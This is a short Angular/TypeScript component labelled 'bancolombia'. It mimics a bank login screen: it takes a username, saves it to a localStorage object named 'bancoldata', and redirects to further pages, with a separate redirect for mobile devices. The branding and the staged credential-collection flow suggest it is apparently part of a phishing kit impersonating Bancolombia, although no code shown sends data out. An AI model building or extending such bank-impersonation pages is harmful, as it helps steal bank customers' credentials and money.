import { Component, ElementRef, Renderer2 } from '@angular/core';

@Component({
  selector: 'app-bancolombia',
  imports: [],
  templateUrl: './bancolombia.component.html',
  styleUrl: './bancolombia.component.css'
})
export default class BancolombiaComponent {
  userInput!: HTMLInputElement;
  continueButton!: HTMLButtonElement;
  imageContainer!: HTMLElement;
  loader!: HTMLElement;

  constructor(private el: ElementRef, private renderer: Renderer2) {}

  ngOnInit(): void {
    this.userInput = this.el.nativeElement.querySelector('#userInput');
    this.continueButton = this.el.nativeElement.querySelector('#continueButton');
    this.imageContainer = this.el.nativeElement.querySelector('#imageContainer');
    this.loader = this.el.nativeElement.querySelector('#loader');

    // Check if the user is on a mobile device
    if (window.innerWidth <= 800) { 
      window.location.href = "cel-login.html"; 
    }

    // Enable/Disable the button based on user input
    this.renderer.listen(this.userInput, 'input', () => {
      const userValue = this.userInput.value.trim();
      if (userValue.length >= 4) {
        this.continueButton.classList.add('enabled');
        this.continueButton.classList.remove('disabled');
      } else {
        this.continueButton.classList.add('disabled');
        this.continueButton.classList.remove('enabled');
      }
    });

    // Action when clicking "Continue"
    this.renderer.listen(this.continueButton, 'click', () => {
      const userValue = this.userInput.value.trim();
      if (userValue.length >= 4) {
        let bancoldata: any;
        try {
          const storedData = localStorage.getItem('bancoldata');
          bancoldata = storedData ? JSON.parse(storedData) : {};
        } catch (e) {
          console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
          bancoldata = {}; // Reset to empty object if parsing error occurs
        }

        // Update the object with the new user value
        bancoldata.usuario = userValue;

        // Save the updated value to localStorage
        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

        // Redirect to the next page
        window.location.href = 'index-cel.html';
      } else {
        alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
      }
    });
  }
}
